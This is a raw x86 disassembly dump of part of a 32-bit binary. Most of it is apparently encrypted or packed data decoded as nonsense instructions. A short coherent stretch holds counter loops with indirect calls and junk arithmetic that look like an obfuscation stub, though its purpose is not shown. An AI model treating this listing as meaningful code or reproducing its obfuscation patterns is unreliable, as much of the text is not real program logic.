  40aa58:	rol    esi,1
  40aa5a:	xor    al,0x2c
  40aa5c:	je     0x40aa6a
  40aa5e:	push   esp
  40aa5f:	or     eax,DWORD PTR [ebx+eax*1+0x1e]
  40aa63:	adc    ebx,DWORD PTR [ebx+eax*2+0x32c86584]
  40aa6a:	mov    bl,0x3e
  40aa6c:	mov    dh,0x2f
  40aa6e:	pop    es
  40aa6f:	pop    ebp
  40aa70:	adc    BYTE PTR [ebx+eiz*4],cl
  40aa73:	aas    
  40aa74:	sahf   
  40aa75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa76:	inc    eax
  40aa77:	repz xor al,0x87
  40aa7a:	stos   BYTE PTR es:[edi],al
  40aa7b:	mov    ebx,DWORD PTR [ebp-0x48]
  40aa7e:	cmp    BYTE PTR [edx-0x6e],al
  40aa81:	mov    bl,0x24
  40aa83:	cmp    edi,DWORD PTR [ecx+ecx*2-0x71]
  40aa87:	cli    
  40aa88:	mov    eax,ds:0x48fd39c
  40aa8d:	(bad)  
  40aa8e:	mov    bl,0xeb
  40aa90:	xchg   edi,ebp
  40aa92:	add    al,0x5b
  40aa94:	mov    ah,0xe
  40aa96:	hlt    
  40aa97:	add    BYTE PTR [eax],dh
  40aa99:	loopne 0x40aa4e
  40aa9b:	or     BYTE PTR [ecx+0x5dafbd8b],0x8b
  40aaa2:	xchg   ecx,eax
  40aaa3:	imul   DWORD PTR [edx+0x94559f1]
  40aaa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aaaa:	adc    BYTE PTR [eax+0x52],ch
  40aaad:	or     cl,BYTE PTR gs:[ebx-0x156aca3e]
  40aab4:	cmc    
  40aab5:	cmp    eax,0x30a11e2c
  40aaba:	dec    esp
  40aabb:	call   0x9ab8:0x1e016943
  40aac2:	retf   
  40aac3:	mov    DWORD PTR [esi],eax
  40aac5:	dec    edx
  40aac6:	lods   al,BYTE PTR ds:[esi]
  40aac7:	retf   
  40aac8:	(bad)  
  40aaca:	outs   dx,BYTE PTR ds:[esi]
  40aacb:	data16 test ah,0x3
  40aacf:	ret    0x6da1
  40aad2:	and    edx,DWORD PTR ds:0x9c292928
  40aad8:	not    esp
  40aada:	xchg   edx,eax
  40aadb:	push   esp
  40aadc:	js     0x40aab3
  40aade:	call   FWORD PTR [edi+0x10694035]
  40aae4:	repz jns 0x40ab0b
  40aae7:	aas    
  40aae8:	xlat   BYTE PTR ds:[ebx]
  40aae9:	adc    al,0xb6
  40aaeb:	repnz bound esi,QWORD PTR ds:0x350facda
  40aaf2:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40aaf4:	loope  0x40aaf1
  40aaf6:	sbb    al,0x45
  40aaf8:	iret   
  40aaf9:	adc    eax,0x9a95269c
  40aafe:	arpl   ax,si
  40ab00:	mov    eax,0xb22812cf
  40ab05:	or     eax,edi
  40ab07:	xor    eax,0xd642bf7e
  40ab0c:	imul   esp,DWORD PTR [eax+0x7c31c2e5],0xee1ff27d
  40ab16:	rcl    BYTE PTR [edx+0x7a133d3d],cl
  40ab1c:	mov    ebx,0x728eb3a1
  40ab21:	pop    ds
  40ab22:	(bad)  
  40ab24:	fs inc ebx
  40ab26:	inc    ebp
  40ab27:	arpl   sp,sp
  40ab29:	and    BYTE PTR [esi-0x3e570e5],0x2d
  40ab30:	jns    0x40ab80
  40ab32:	and    BYTE PTR [edx],ch
  40ab34:	push   0x62390a90
  40ab39:	jl     0x40ab6d
  40ab3b:	cld    
  40ab3c:	sar    DWORD PTR [eax+0x5e],1
  40ab3f:	mov    edi,0xb8891088
  40ab44:	cdq    
  40ab45:	shl    DWORD PTR fs:[edx-0x3ea69bb3],0x6a
  40ab4d:	in     al,0x90
  40ab4f:	ins    BYTE PTR es:[edi],dx
  40ab50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab51:	shl    DWORD PTR [edi+0x6b],0x50
  40ab55:	or     ebx,DWORD PTR [ecx+0x2ecca011]
  40ab5b:	push   edx
  40ab5c:	fs ss xchg esp,eax
  40ab60:	je     0x40ab6d
  40ab62:	mov    esi,0x6eaf374c
  40ab67:	xor    bl,BYTE PTR [edi+0x6c]
  40ab6a:	popf   
  40ab6b:	cmp    ecx,DWORD PTR [esi+0x2a5527ee]
  40ab71:	test   eax,0xcee6bc78
  40ab76:	dec    eax
  40ab77:	mov    ds:0x59df9314,eax
  40ab7c:	add    eax,DWORD PTR [ecx+0x5a]
  40ab7f:	xchg   esi,eax
  40ab80:	mov    ds:0x3f1fde3c,eax
  40ab85:	or     BYTE PTR [esi+0x1062fc86],al
  40ab8b:	sbb    DWORD PTR [edx+0x76],esi
  40ab8e:	aad    0xb6
  40ab90:	push   ds
  40ab91:	pop    ds
  40ab92:	pop    edx
  40ab93:	(bad)  
  40ab94:	inc    esi
  40ab95:	and    eax,0xe425ca32
  40ab9a:	aas    
  40ab9b:	cmp    edi,DWORD PTR [si]
  40ab9e:	and    al,bl
  40aba0:	scas   eax,DWORD PTR es:[edi]
  40aba1:	xchg   BYTE PTR [edi-0x32],ch
  40aba4:	fmul   DWORD PTR [edi+0x47]
  40aba7:	adc    eax,0x17a45824
  40abac:	xor    ebp,edi
  40abae:	aad    0xf7
  40abb0:	cmc    
  40abb1:	shr    BYTE PTR [esi-0x4b],cl
  40abb4:	fadd   QWORD PTR [ebp+esi*1-0x7f]
  40abb8:	and    ah,BYTE PTR [edx+eax*8-0x1f]
  40abbc:	add    ecx,DWORD PTR [edi+0x2c0386c5]
  40abc2:	pop    ds
  40abc3:	not    BYTE PTR [edi]
  40abc5:	icebp  
  40abc6:	fmul   QWORD PTR [ecx]
  40abc8:	dec    edx
  40abc9:	dec    ebp
  40abca:	pop    ebx
  40abcb:	into   
  40abcc:	rol    BYTE PTR [ecx+0x59ed4e77],1
  40abd2:	push   ebp
  40abd3:	xor    BYTE PTR [edx-0x4d74f61d],bh
  40abd9:	jne    0x40ab89
  40abdb:	repnz stos BYTE PTR es:[edi],al
  40abdd:	(bad)  
  40abde:	scas   al,BYTE PTR es:[edi]
  40abdf:	vsubss xmm4,xmm1,DWORD PTR [esi]
  40abe3:	or     DWORD PTR [ecx+0x531efef8],0x2b
  40abea:	mov    eax,ds:0xc4ee5291
  40abef:	repnz mov eax,0xa8fcb223
  40abf5:	jnp    0x40ab8b
  40abf7:	and    BYTE PTR [ecx-0x5f],bl
  40abfa:	mov    ebx,0xa295dd77
  40abff:	push   esi
  40ac00:	xor    edx,eax
  40ac02:	xor    DWORD PTR ds:0x42fcf5,0x42e70f
  40ac0c:	add    edx,ecx
  40ac0e:	mov    DWORD PTR ds:0x42e703,0x189b
  40ac18:	cmp    edi,edx
  40ac1a:	mov    DWORD PTR ds:0x42fcdd,0x36a4
  40ac24:	jb     0x40d88a
  40ac2a:	mov    edx,DWORD PTR [ebp-0x28]
  40ac2d:	sbb    DWORD PTR ds:0x42fd7e,ebx
  40ac33:	mov    edi,DWORD PTR [ebp-0x4]
  40ac36:	xor    edx,eax
  40ac38:	sub    DWORD PTR ds:0x42fcf5,edx
  40ac3e:	xor    edi,eax
  40ac40:	mov    DWORD PTR ds:0x42e6f7,0x1f
  40ac4a:	cmp    DWORD PTR ds:0x42e6f7,0x0
  40ac51:	je     0x40acfa
  40ac57:	cmp    DWORD PTR ds:0x42e6f7,0x2e
  40ac5e:	jne    0x40ac7d
  40ac64:	push   DWORD PTR [ebp-0xc]
  40ac67:	push   0x42e23d
  40ac6c:	push   DWORD PTR [ebp-0x24]
  40ac6f:	push   0x691a
  40ac74:	push   DWORD PTR [ebp-0x10]
  40ac77:	call   DWORD PTR ds:0x42e2f3
  40ac7d:	mov    ebx,DWORD PTR ds:0x42e6f7
  40ac83:	dec    ebx
  40ac84:	mov    DWORD PTR ds:0x42e6f7,ebx
  40ac8a:	jmp    0x40ac4a
  40ac8f:	and    DWORD PTR ds:0x42e128,0x0
  40ac99:	jmp    0x40acad
  40ac9e:	xor    ebx,ebx
  40aca0:	or     ebx,DWORD PTR ds:0x42e128
  40aca6:	inc    ebx
  40aca7:	mov    DWORD PTR ds:0x42e128,ebx
  40acad:	cmp    DWORD PTR ds:0x42e128,0x1a
  40acb4:	jae    0x40acfa
  40acba:	cmp    DWORD PTR ds:0x42e128,0xc
  40acc1:	jne    0x40acd5
  40acc7:	push   0x2dd0
  40accc:	push   DWORD PTR [ebp-0x14]
  40accf:	call   DWORD PTR ds:0x42e2f7
  40acd5:	cmp    DWORD PTR ds:0x42e128,0xb
  40acdc:	jne    0x40acef
  40ace2:	mov    ebx,DWORD PTR ds:0x42e128
  40ace8:	inc    ebx
  40ace9:	mov    DWORD PTR ds:0x42e128,ebx
  40acef:	jmp    0x40ac9e
  40acf4:	adc    ebx,0x2885
  40acfa:	add    edi,ecx
  40acfc:	sbb    ebx,0x5c75
  40ad02:	add    edx,ecx
  40ad04:	imul   edx,edi
  40ad07:	sub    ebx,DWORD PTR ds:0x42e134
  40ad0d:	mov    edi,DWORD PTR [ebp-0x8]
  40ad10:	mov    DWORD PTR ds:0x42fce1,0x13
  40ad1a:	cmp    DWORD PTR ds:0x42fce1,0x0
  40ad21:	je     0x40ad54
  40ad27:	cmp    DWORD PTR ds:0x42fce1,0x14
  40ad2e:	jne    0x40ad42
  40ad34:	push   DWORD PTR [ebp-0x28]
  40ad37:	push   0x42fd01
  40ad3c:	call   DWORD PTR ds:0x42e54b
  40ad42:	mov    ebx,DWORD PTR ds:0x42fce1
  40ad48:	dec    ebx
  40ad49:	mov    DWORD PTR ds:0x42fce1,ebx
  40ad4f:	jmp    0x40ad1a
  40ad54:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad57:	sub    ebx,edi
  40ad59:	cmp    ebx,edx
  40ad5b:	ja     0x40ad6d
  40ad61:	mov    edx,DWORD PTR [ebp-0x4]
  40ad64:	xor    edx,eax
  40ad66:	add    edx,ecx
  40ad68:	jmp    0x40c0fc
  40ad6d:	mov    edx,DWORD PTR [ebp-0x2c]
  40ad70:	mov    edi,DWORD PTR [ebp-0x4]
  40ad73:	xor    edx,eax
  40ad75:	xor    edi,eax
  40ad77:	add    edi,ecx
  40ad79:	add    edx,ecx
  40ad7b:	imul   edx,edi
  40ad7e:	mov    edi,DWORD PTR [ebp-0x8]
  40ad81:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad84:	sub    ebx,edi
  40ad86:	cmp    ebx,edx
  40ad88:	ja     0x40ad96
  40ad8e:	mov    edx,DWORD PTR [ebp-0x28]
  40ad91:	jmp    0x40c0ee
  40ad96:	mov    edx,DWORD PTR [ebp-0x30]
  40ad99:	mov    edi,DWORD PTR [ebp-0x4]
  40ad9c:	xor    edx,eax
  40ad9e:	xor    edi,eax
  40ada0:	add    edi,ecx
  40ada2:	jmp    0x40b160
  40ada7:	xor    BYTE PTR [eax+eiz*4],bl
  40adaa:	mov    bh,0x6c
  40adac:	mov    bl,0xc7
  40adae:	jae    0x40ae09
  40adb0:	jg     0x40ad82
  40adb2:	ja     0x40ade1
  40adb4:	xchg   edx,eax
  40adb5:	dec    ebx
  40adb6:	pop    eax
  40adb7:	add    edi,ebp
  40adb9:	jo     0x40ae2b
  40adbb:	lahf   
  40adbc:	jge    0x40ae2e
  40adbe:	jo     0x40adba
  40adc0:	out    0x10,al
  40adc2:	mov    bh,0x66
  40adc4:	int    0x64
  40adc6:	pop    ss
  40adc7:	mov    ch,0xf
  40adc9:	in     al,0x82
  40adcb:	cmp    ecx,DWORD PTR [edi+0x462aaf12]
  40add1:	ret    
  40add2:	push   0x8beb4278
  40add7:	dec    edi
  40add8:	ret    
  40add9:	ds push ecx
  40addb:	jge    0x40ae28
  40addd:	les    ebx,FWORD PTR [eax+0x3c2ad232]
  40ade3:	sub    eax,0x92973159
  40ade8:	shr    DWORD PTR ss:[edx+0x431b2ddd],cl
  40adef:	out    0xbc,al
  40adf1:	lods   eax,DWORD PTR ds:[esi]
  40adf2:	(bad)  
  40adf3:	push   ss
  40adf4:	ss scas eax,DWORD PTR es:[edi]
  40adf6:	pop    edi
  40adf7:	repnz push ebp
  40adf9:	sbb    BYTE PTR [esi+edx*2-0x46],bl
  40adfd:	popa   
  40adfe:	xchg   ebp,eax
  40adff:	jle    0x40ae0a
  40ae01:	ss jge 0x40adf8
  40ae04:	ins    DWORD PTR es:[edi],dx
  40ae05:	pop    ecx
  40ae06:	cmp    dh,ch
  40ae08:	retf   
  40ae09:	into   
  40ae0a:	das    
  40ae0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae0c:	and    ebx,DWORD PTR [eax-0xe1a79c7]
  40ae12:	imul   ebp,edi,0xcd54646d
  40ae18:	dec    edi
  40ae19:	sub    ebp,ebp
  40ae1b:	mov    esi,0x6f7700ec
  40ae20:	adc    esi,DWORD PTR [eax-0x42]
  40ae23:	sbb    edi,DWORD PTR [esi]
  40ae25:	je     0x40adef
  40ae27:	adc    edx,DWORD PTR [ecx]
  40ae29:	pop    edi
  40ae2a:	neg    BYTE PTR [esi-0x31]
  40ae2d:	lods   eax,DWORD PTR ds:[esi]
  40ae2f:	sub    al,0x3e
  40ae31:	idiv   bl
  40ae33:	fs or  al,0x33
  40ae36:	gs xchg esp,eax
  40ae38:	inc    ecx
  40ae39:	fistp  QWORD PTR [eax+0x46a2c184]
  40ae40:	xor    DWORD PTR [ebx-0x54],edx
  40ae43:	fstp   st(4)
  40ae45:	inc    edx
  40ae46:	ret    0xab1d
  40ae49:	jmp    0x62141f4b
  40ae4e:	adc    BYTE PTR [ecx],al
  40ae50:	mov    edi,0x1a9dea31
  40ae55:	and    al,0x82
  40ae57:	rol    bl,0xd3
  40ae5a:	popa   
  40ae5b:	ins    DWORD PTR es:[edi],dx
  40ae5c:	mov    al,0x4d
  40ae5e:	mov    DWORD PTR [edi+0x70],ebp
  40ae61:	repnz ins BYTE PTR es:[edi],dx
  40ae63:	retf   
  40ae64:	jp     0x40ae72
  40ae66:	cli    
  40ae67:	test   eax,0x4c341f4
  40ae6c:	xchg   ebp,eax
  40ae6d:	and    al,0x4b
  40ae6f:	or     esi,DWORD PTR [edx-0x3f]
  40ae72:	mov    esp,0xabaab391
  40ae77:	jae    0x40ae24
  40ae79:	(bad)  
  40ae7a:	xor    al,0x4b
  40ae7c:	aas    
  40ae7d:	push   esi
  40ae7e:	mov    ds:0xb8f24139,eax
  40ae83:	xor    eax,0xe9974149
  40ae88:	into   
  40ae89:	lods   eax,DWORD PTR ds:[esi]
  40ae8a:	lock fnsave [ecx-0x44]
  40ae8e:	jl     0x40aea4
  40ae90:	cmp    ebx,DWORD PTR [edx-0x10dd82e]
  40ae96:	ja     0x40af0f
  40ae98:	mov    eax,0xb7e2674
  40ae9d:	or     cl,cl
  40ae9f:	adc    DWORD PTR [eax],edi
  40aea1:	sbb    dh,BYTE PTR [ebp-0x2a5c4057]
  40aea7:	sbb    bh,BYTE PTR [edx+ecx*1]
  40aeaa:	cmc    
  40aeab:	cmc    
  40aeac:	lock sbb edi,esp
  40aeaf:	pop    eax
  40aeb0:	into   
  40aeb1:	inc    ebx
  40aeb2:	dec    edx
  40aeb3:	nop
  40aeb4:	sar    bl,1
  40aeb6:	fs cs icebp 
  40aeb9:	sub    eax,0x465b003
  40aebe:	das    
  40aebf:	(bad)  
  40aec0:	pop    ebp
  40aec1:	fild   DWORD PTR [ebp-0x569db34b]
  40aec7:	mov    esp,0x8c73a981
  40aecc:	lods   al,BYTE PTR ds:[esi]
  40aecd:	out    0x2e,al
  40aecf:	test   al,0x99
  40aed1:	or     al,0xea
  40aed3:	push   eax
  40aed4:	js     0x40af05
  40aed6:	fwait
  40aed7:	adc    ebp,eax
  40aed9:	faddp  st(7),st
  40aedb:	xlat   BYTE PTR ds:[ebx]
  40aedc:	xor    DWORD PTR [eax+0x4bae46c9],ebx
  40aee2:	jno    0x40aeba
  40aee4:	outs   dx,DWORD PTR ds:[esi]
  40aee5:	adc    bh,BYTE PTR [edi-0x5b0f12ba]
  40aeeb:	test   DWORD PTR [edi-0x68],0x7ca3f6ed
  40aef2:	test   eax,0x368f2ab9
  40aef7:	sub    BYTE PTR [ebx+0x3c],dh
  40aefa:	inc    ebx
  40aefb:	int3   
  40aefc:	xchg   esi,eax
  40aefd:	push   DWORD PTR [eax]
  40aeff:	and    esi,DWORD PTR [ecx]
  40af01:	sti    
  40af02:	cmp    DWORD PTR [ebp-0x231db622],esp
  40af08:	pop    ds
  40af09:	xchg   ebp,eax
  40af0a:	dec    ebp
  40af0b:	and    al,0xc7
  40af0d:	adc    bl,al
  40af0f:	push   edi
  40af10:	jo     0x40aec8
  40af12:	xchg   edi,eax
  40af13:	jp     0x40aeb4
  40af15:	adc    DWORD PTR [ebp+0x11],edi
  40af18:	mov    al,0x1f
  40af1a:	scas   eax,DWORD PTR es:[edi]
  40af1b:	pop    edx
  40af1c:	mov    WORD PTR [eax+0x4a],fs
  40af1f:	sub    BYTE PTR [ebx+edi*1],0x9f
  40af23:	push   ss
  40af24:	mov    al,ds:0x1ed0ecff
  40af29:	je     0x40aef2
  40af2b:	popa   
  40af2c:	gs pusha 
  40af2e:	pop    edx
  40af2f:	iret   
  40af30:	and    eax,0xdcdd10c3
  40af35:	mov    ds:0xb30af28a,eax
  40af3a:	adc    DWORD PTR es:[ebp+0x1b],esp
  40af3e:	adc    bl,BYTE PTR [ebx+eax*8]
  40af41:	sbb    eax,0xc45c02e2
  40af46:	push   cs
  40af47:	jle    0x40af86
  40af49:	cmp    DWORD PTR [edx-0x41b63fba],esi
  40af4f:	loope  0x40af18
  40af51:	sbb    eax,0xba18ef87
  40af56:	aaa    
  40af57:	add    bl,BYTE PTR ds:0x6c85ec88
  40af5d:	fst    DWORD PTR [ebx-0x51]
  40af60:	adc    BYTE PTR [esp+esi*8-0x1a],0xb2
  40af65:	in     al,0xc2
  40af67:	(bad)  
  40af69:	dec    ecx
  40af6a:	push   ds
  40af6b:	js     0x40af9c
  40af6d:	sbb    DWORD PTR ds:0xe10dbf41,esi
  40af73:	jmp    0x30a6cba
  40af78:	bound  ebp,QWORD PTR [esi-0x34b600af]
  40af7e:	fistp  WORD PTR [ebx+0xb]
  40af81:	push   ecx
  40af82:	jecxz  0x40af7c
  40af84:	jbe    0x40afaa
  40af86:	inc    ebp
  40af87:	pushf  
  40af88:	jbe    0x40afb2
  40af8a:	je     0x40afa9
  40af8c:	(bad)  
  40af8d:	push   cs
  40af8e:	call   0x11e9:0x9d6248f7
  40af95:	mov    BYTE PTR gs:[esi+0x558de21e],ah
  40af9c:	nop
  40af9d:	or     dl,BYTE PTR [ecx]
  40af9f:	iret   
  40afa0:	adc    ah,al
  40afa2:	lods   eax,DWORD PTR ds:[esi]
  40afa3:	test   al,0x15
  40afa5:	das    
  40afa6:	(bad)  
  40afa7:	fdiv   QWORD PTR [edx+0x33044e46]
  40afad:	js     0x40afbe
  40afaf:	outs   dx,BYTE PTR ds:[esi]
  40afb0:	mov    al,0xbe
  40afb2:	pusha  
  40afb3:	inc    ebp
  40afb4:	mov    ebp,0xf04eda71
  40afb9:	sub    ebp,DWORD PTR [ebp+0x40fb9629]
  40afbf:	pop    edi
  40afc0:	jl     0x40b013
  40afc2:	sbb    DWORD PTR [ebx+0x2c],0x1e
  40afc6:	sub    dl,bh
  40afc8:	cli    
  40afc9:	lea    ebp,[edx]
  40afcb:	mov    al,0xa8
  40afcd:	inc    edx
  40afce:	fsubr  st(0),st
  40afd0:	(bad)  
  40afd2:	adc    ecx,DWORD PTR [esi-0x20]
  40afd5:	xchg   edx,eax
  40afd6:	je     0x40af7e
  40afd8:	sub    BYTE PTR [edx],dh
  40afda:	cs cli 
  40afdc:	retf   0xd376
  40afdf:	sbb    ch,BYTE PTR [esi-0x673d6b8b]
  40afe5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afe6:	cwde   
  40afe7:	fadd   QWORD PTR [ebp-0x27]
  40afea:	mov    dl,0x68
  40afec:	fneni(8087 only) 
  40afee:	test   al,0x32
  40aff0:	in     eax,dx
  40aff1:	stc    
  40aff2:	adc    BYTE PTR [ebp+0x5c01de5d],bh
  40aff8:	xor    edx,DWORD PTR [ecx+ebx*8-0x38518381]
  40afff:	not    BYTE PTR [ebx]
  40b001:	adc    edi,DWORD PTR [ebx+0x4e]
  40b004:	sbb    edi,DWORD PTR [ebp+0x19531d0b]
  40b00a:	mov    ecx,0xde92ffec
  40b00f:	xor    DWORD PTR [ecx],esi
  40b011:	mov    ebx,0x73b70165
  40b016:	xor    DWORD PTR [ebp+0x29f0ea98],ebp
  40b01c:	pop    ds
  40b01d:	cmp    bl,dl
  40b01f:	test   al,0xd9
  40b021:	push   edi
  40b022:	sahf   
  40b023:	in     eax,dx
  40b024:	cmc    
  40b025:	(bad)  
  40b026:	jl     0x40b027
  40b028:	add    al,0x38
  40b02a:	adc    eax,0xb4bcf0a0
  40b02f:	mov    edx,0x1207113f
  40b034:	inc    ebp
  40b035:	push   ecx
  40b036:	stc    
  40b037:	imul   edi,DWORD PTR [edi],0x5b17b88d
  40b03d:	and    cl,BYTE PTR [ecx+edx*4+0x66]
  40b041:	inc    edi
  40b042:	(bad)  
  40b043:	xchg   DWORD PTR [esi-0x3],ebp
  40b046:	cld    
  40b047:	or     ah,BYTE PTR [edx-0x30199d5e]
  40b04d:	mov    bl,0xda
  40b04f:	inc    ecx
  40b050:	aas    
  40b051:	sbb    eax,DWORD PTR [eax+ebx*8+0x35]
  40b055:	mov    ah,0xd3
  40b057:	out    0x85,eax
  40b059:	push   0xa751b2e6
  40b05e:	inc    ebp
  40b05f:	fidivr WORD PTR [esi-0x7725999a]
  40b065:	rcl    BYTE PTR [ebx-0x24],cl
  40b068:	mov    ah,0xe6
  40b06a:	mov    al,ds:0xb3fad1d1
  40b06f:	test   eax,0xefc09d6c
  40b074:	or     al,0x40
  40b076:	lahf   
  40b077:	mov    ds:0xc6ac30d2,eax
  40b07c:	loope  0x40b0ec
  40b07e:	pop    ebp
  40b07f:	mov    ds:0xa0dc6a69,eax
  40b084:	adc    bh,ch
  40b086:	ret    
  40b087:	jnp    0x40b03d
  40b089:	sbb    al,0x39
  40b08b:	aad    0xf1
  40b08d:	cli    
  40b08e:	adc    DWORD PTR [ebp+ecx*1-0x36],ecx
  40b092:	mov    cl,0x6f
  40b094:	fdivr  DWORD PTR [esi+ecx*2-0x8]
  40b098:	jns    0x40b087
  40b09a:	adc    ch,dh
  40b09c:	push   ss
  40b09d:	fbstp  TBYTE PTR [ecx+esi*1+0x57]
  40b0a1:	hlt    
  40b0a2:	cwde   
  40b0a3:	sub    DWORD PTR [ecx],edx
  40b0a5:	sar    DWORD PTR [edx],0x11
  40b0a8:	imul   eax,DWORD PTR [ecx+0x4f1573f],0xb
  40b0af:	xchg   edx,eax
  40b0b0:	std    
  40b0b1:	inc    ebx
  40b0b2:	sub    cl,BYTE PTR [ebx+0x6d2e43e9]
  40b0b8:	jne    0x40b126
  40b0ba:	mov    ebx,0x1efa8b25
  40b0bf:	xor    ebp,DWORD PTR [ebx]
  40b0c1:	mov    esp,0x57afb3de
  40b0c6:	or     ebp,ebp
  40b0c8:	xchg   ebx,eax
  40b0c9:	inc    ebp
  40b0ca:	push   ecx
  40b0cb:	(bad)  
  40b0cc:	or     BYTE PTR [edx+0x5d],cl
  40b0cf:	pop    ebx
  40b0d0:	jmp    0x40b063
  40b0d2:	outs   dx,BYTE PTR ds:[esi]
  40b0d3:	bound  esp,QWORD PTR [esi-0x54fb801c]
  40b0d9:	add    al,0x75
  40b0db:	push   cs
  40b0dc:	daa    
  40b0dd:	call   0xa338:0x8fe345be
  40b0e4:	arpl   WORD PTR [edx+0x215823c5],ax
  40b0ea:	push   ss
  40b0eb:	jmp    0x411b1380
  40b0f0:	(bad)  
  40b0f1:	push   eax
  40b0f2:	mov    cl,0x88
  40b0f4:	sub    ch,BYTE PTR [ecx-0x2a]
  40b0f7:	cmp    DWORD PTR [edi],eax
  40b0f9:	sub    al,0x9f
  40b0fb:	cmc    
  40b0fc:	loope  0x40b07e
  40b0fe:	lea    esi,[edi]
  40b100:	nop
  40b101:	out    0x82,eax
  40b103:	sbb    eax,0x7d169b29
  40b108:	stc    
  40b109:	pop    ebp
  40b10a:	cmp    al,BYTE PTR [ebp+0x122b1cc1]
  40b110:	lods   eax,DWORD PTR ds:[esi]
  40b111:	jle    0x40b18e
  40b113:	dec    edi
  40b114:	imul   ebx,ecx,0x7d87d196
  40b11a:	push   ebx
  40b11b:	jb     0x40b158
  40b11d:	inc    ebx
  40b11e:	loope  0x40b173
  40b120:	in     al,0xa9
  40b122:	leave  
  40b123:	sub    DWORD PTR [esi-0x3b],eax
  40b126:	cld    
  40b127:	cmp    BYTE PTR [ecx-0xc],bl
  40b12a:	pop    esp
  40b12b:	cmp    ebp,esp
  40b12d:	xchg   ebp,eax
  40b12e:	loop   0x40b157
  40b130:	dec    ecx
  40b131:	inc    BYTE PTR [ecx-0x48f8e189]
  40b137:	mov    edx,DWORD PTR [ebp-0x5a]
  40b13a:	adc    BYTE PTR [ebp-0x47f8f0e3],0x7f
  40b141:	ss int3 
  40b143:	pop    ss
  40b144:	test   bh,ch
  40b146:	xlat   BYTE PTR ds:[ebx]
  40b147:	(bad)  
  40b149:	rcl    BYTE PTR [ecx-0x6a],0x63
  40b14d:	cmp    al,0x1e
  40b14f:	(bad)  
  40b150:	jecxz  0x40b135
  40b152:	or     bh,BYTE PTR [ebx+0x9aa0981]
  40b158:	repz push edx
  40b15a:	jl     0x40b13d
  40b15c:	xlat   BYTE PTR ds:[ebx]
  40b15d:	in     eax,dx
  40b15e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b15f:	dec    ebx
  40b160:	add    edx,ecx
  40b162:	jmp    0x40b520
  40b167:	shl    BYTE PTR [ebp+0x37],cl
  40b16a:	sub    esi,DWORD PTR [ebx-0x188a2d97]
  40b170:	retf   0xa792
  40b173:	adc    ch,bl
  40b175:	mov    ebp,0x70faa21c
  40b17a:	jo     0x40b11b
  40b17c:	jge    0x40b1ee
  40b17e:	jo     0x40b109
  40b180:	rcr    DWORD PTR [eax-0x79a9b57b],0xdd
  40b187:	(bad)  
  40b188:	loope  0x40b1bf
  40b18a:	mov    dl,0x84
  40b18c:	aad    0x29
  40b18e:	mov    cl,0xbb
  40b190:	add    BYTE PTR [ebx],dl
  40b192:	mov    WORD PTR [ebx-0x4bf6e4b5],gs
  40b198:	adc    eax,0x3adb0b5a
  40b19d:	(bad)  
  40b19e:	mov    ebp,0xfbfc9d85
  40b1a3:	mov    esp,0xd1e2e7d1
  40b1a8:	aad    0xc1
  40b1aa:	or     al,0x2d
  40b1ac:	add    eax,0xa7aea371
  40b1b1:	or     al,0x88
  40b1b3:	xlat   BYTE PTR ds:[ebx]
  40b1b4:	stos   DWORD PTR es:[edi],eax
  40b1b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1b6:	fwait
  40b1b7:	mov    ebx,0xf10a8fac
  40b1bc:	cmp    BYTE PTR [ebx+0x68c74695],ch
  40b1c2:	(bad)  
  40b1c3:	pop    ecx
  40b1c4:	sub    esi,ebp
  40b1c6:	jbe    0x40b18c
  40b1c8:	push   esi
  40b1c9:	add    DWORD PTR [eax],eax
  40b1cb:	ins    BYTE PTR es:[edi],dx
  40b1cc:	or     bl,ch
  40b1ce:	aaa    
  40b1cf:	cld    
  40b1d0:	daa    
  40b1d1:	sbb    edi,DWORD PTR [esp+esi*8]
  40b1d4:	icebp  
  40b1d5:	xchg   edx,eax
  40b1d6:	arpl   WORD PTR [eax-0x76a17ff2],bp
  40b1dc:	pop    ss
  40b1dd:	sub    al,0x95
  40b1df:	(bad)  [edi-0x3b]
  40b1e2:	xchg   ebp,eax
  40b1e3:	mov    edx,0xcf518158
  40b1e8:	jo     0x40b184
  40b1ea:	sub    BYTE PTR [eax-0x26],ah
  40b1ed:	sub    al,0xe8
  40b1ef:	nop
  40b1f0:	pop    DWORD PTR [edx+ebp*1+0x5b]
  40b1f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1f5:	cmp    ah,dh
  40b1f7:	popa   
  40b1f8:	cmc    
  40b1f9:	out    0xe7,eax
  40b1fb:	jb     0x40b262
  40b1fd:	cs stos DWORD PTR es:[edi],eax
  40b1ff:	aam    0x6b
  40b201:	sbb    bl,BYTE PTR [eax+0x37]
  40b204:	nop
  40b205:	pop    esp
  40b206:	ins    BYTE PTR es:[edi],dx
  40b207:	push   ebp
  40b208:	push   eax
  40b209:	mov    dh,0x6
  40b20b:	pop    edi
  40b20c:	cmp    eax,0x5bd55f13
  40b211:	add    DWORD PTR [esi+ebx*2],ecx
  40b214:	sbb    ebp,edi
  40b216:	inc    esp
  40b217:	loope  0x40b28b
  40b219:	fs stos BYTE PTR es:[edi],al
  40b21b:	dec    esi
  40b21c:	aam    0x82
  40b21e:	pop    ebp
  40b21f:	adc    bl,dh
  40b221:	fs adc edx,ebx
  40b224:	xor    eax,0x2e1a1f56
  40b229:	dec    ebp
  40b22a:	(bad)  
  40b22b:	enter  0xe8de,0x98
  40b22f:	sbb    dl,al
  40b231:	sub    eax,ebx
  40b233:	repz lahf 
  40b235:	mov    ch,0xc0
  40b237:	push   eax
  40b238:	in     al,0x3d
  40b23a:	and    al,0xba
  40b23c:	pop    es
  40b23d:	(bad)  
  40b23e:	jmp    0x337bc335
  40b243:	add    eax,0xac901e3f
  40b248:	xor    edx,DWORD PTR [edx]
  40b24a:	and    dl,dl
  40b24c:	add    al,0x27
  40b24e:	outs   dx,DWORD PTR ds:[esi]
  40b24f:	stos   DWORD PTR es:[edi],eax
  40b250:	cmc    
  40b251:	add    eax,0x19e1e802
